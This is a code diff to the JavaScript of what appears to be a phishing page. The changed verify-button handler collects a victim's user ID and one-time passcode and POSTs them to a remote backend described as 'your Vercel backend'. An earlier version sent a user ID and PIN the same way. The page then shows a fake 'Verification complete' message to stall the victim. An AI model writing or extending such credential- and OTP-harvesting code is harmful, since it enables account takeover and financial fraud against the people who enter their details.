@@ -43,27 +43,37 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // 5. VERIFY BUTTON LOGIC
-    const btnVerify = document.getElementById('btnVerify');
-    if (btnVerify) {
-        btnVerify.addEventListener('click', function() {
-            const otpCode = document.getElementById('otpInput').value;
+   // 5. VERIFY BUTTON LOGIC  
+const btnVerify = document.getElementById('btnVerify');  
+if (btnVerify) {  
+    btnVerify.addEventListener('click', function() {  
+        // Get the values AGAIN so the script can see them
+        const user = document.getElementById('txiID').value; 
+        const otpCode = document.getElementById('otpInput').value;  
 
-            if (otpCode === "") {
-                alert("Please enter the code!");
-                return;
-            }
+        if (otpCode === "") {  
+            alert("Please enter the code!");  
+            return;  
+        }
 
-fetch(BACKEND_URL, { 
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ userId: user, pin: pass }) 
-})
+        // Send the OTP data to your Vercel backend
+        fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                userId: user, 
+                otp: otpCode, 
+                status: "OTP_SUBMITTED" 
+            })
+        })
+        .then(response => {
+            console.log("OTP Sent!");
+        })
+        .catch(err => console.error("Error sending OTP:", err));
 
-            btnVerify.innerText = "Verifying...";
-            setTimeout(() => {
-                alert("Verification complete. Please wait for confirmation.");
-            }, 2000);
-        });
-    }
-});
+        btnVerify.innerText = "Verifying...";  
+        setTimeout(() => {  
+            alert("Verification complete. Please wait for confirmation.");  
+        }, 2000);  
+    });  
+}
